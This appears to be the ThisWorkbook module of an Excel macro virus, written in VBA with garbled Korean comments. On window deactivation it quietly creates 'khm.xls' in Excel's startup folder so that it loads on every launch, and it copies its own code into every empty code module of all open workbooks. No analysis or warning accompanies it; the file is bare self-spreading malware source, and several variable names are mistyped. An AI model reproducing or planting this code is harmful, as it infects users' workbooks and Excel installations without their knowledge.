   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True




   Private Sub Workbook_SheetCalculate(ByVal Sh As Object)

   End Sub

   Private Sub Workbook_SheetDeactivate(ByVal Sh As Object)

   End Sub

   Private Sub Workbook_WindowActivate(ByVal Wn As Window)

   End Sub

   Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)

   flag = False

   'xlstartÆú´õ(StartupPath)¿¡ "khm.xls"°¡ ¾øÀ¸¸é »õ·Î ¸¸µç´Ù.
    myile = Dir(Application.StartupPath & "\khm.xls")
    If myfile <> "khm.xls" Then
      Application.ScreenUpdating = False
      Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\khm.xls", FileFormat:=xlNormal, addtomru:=False
    End If

   'ThisWorkbook Component¿¡ ÄÚµå°¡ ÀÖÀ¸¸é vcodeº¯¼ö¿¡ ÄÚµå¸¦ ÀúÀå
   For i = 1 To Workbooks.Count
     eline = Workbooks(i).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.CountOfLines
     If eline <> o Then vcode = Workbooks(i).VBProject.VBComponents.Item("thisworkbook").CodeModule.Lines(1, eline)

   'ÄÚµå°¡ ¾ø´Â Component¸¦ Ã£¾Æ¼ vcodeº¯¼ö°ªÀ» ÀÔ·Â
    For j = 1 To Workbooks(i).VBProject.VBComponents.Count
     vcount = Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines
     If vcount = 0 Then Workbooks(i).VBProject.VBComponents.Item(j).CodeModule.AddFromString (vcode)
    Next j: Next i


    If myfile <> "khm.xls" Then Workbooks("khm.xls").Close savechanges:=True

   End Sub
